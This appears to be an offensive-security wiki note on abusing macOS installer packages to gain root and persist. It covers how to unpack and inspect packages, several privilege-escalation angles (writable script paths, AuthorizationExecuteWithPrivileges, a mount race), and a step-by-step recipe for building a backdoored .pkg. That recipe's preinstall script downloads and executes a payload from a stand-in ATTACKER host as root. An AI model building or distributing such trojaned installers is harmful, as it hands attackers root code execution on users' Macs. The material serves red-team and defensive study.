---
title: "macOS Installer Abuse"
type: technique
tags: [macos, privilege-escalation, persistence]
phase: privilege-escalation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-macos]
---

## Installer (.pkg / .dmg) abuse for root

Installer packages run pre/post-install scripts as root and embed executable JavaScript in the distribution XML, making them both a privesc surface and a malware delivery format. A `.pkg` is a `xar` archive holding Distribution (xml), PackageInfo (xml), a Bill of Materials (bom), and gzip'd CPIO Payload/Scripts.

Inspect any package without running it:

```bash
pkgutil --expand /path/package.pkg /tmp/out        # unpack structure
xar -xf /path/package.pkg -C /tmp/out              # manual unpack
cat /tmp/out/Scripts | gzip -dc | cpio -i          # extract pre/post scripts
lsbom /tmp/out/*.pkg/Bom                            # files + permissions installed
```

Privesc angles against installers already on the box or run interactively:
- Script executes from a public path (e.g. `/var/tmp/Installerutil`) that you can pre-create or overwrite, so your file runs as root when the install fires.
- `AuthorizationExecuteWithPrivileges(path,...)` is called by many updaters to run `path` as root; if `path` is attacker-writable you gain root. Break on it: `lldb -o 'b AuthorizationExecuteWithPrivileges'`, or watch FS events for the target.
- Mount race: an installer that writes to a fixed dir like `/tmp/fixedname/...` can be pre-empted by mounting a `noowners` volume over that path so you can swap any file mid-install (CVE-2021-26089 overwrote a periodic script for root).

Build a backdoored installer (empty payload, all logic in scripts + `system.run` JS in dist.xml):

```bash
mkdir -p pkgroot/scripts
cat > pkgroot/scripts/preinstall <<'EOF'
#!/bin/bash
curl -o /tmp/p.sh http://ATTACKER/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh
exit 0
EOF
pkgbuild --root pkgroot/root --scripts pkgroot/scripts \
  --identifier com.x.app --version 1.0 app.pkg
# dist.xml with <script><![CDATA[ function preflight(){ system.run("/path/preinstall"); } ]]></script>
productbuild --distribution dist.xml --package-path app.pkg final.pkg
```

The `AuthorizationExecuteWithPrivileges` root trampoline is shared with the authorization framework (see [[macos-authorization-db]]).
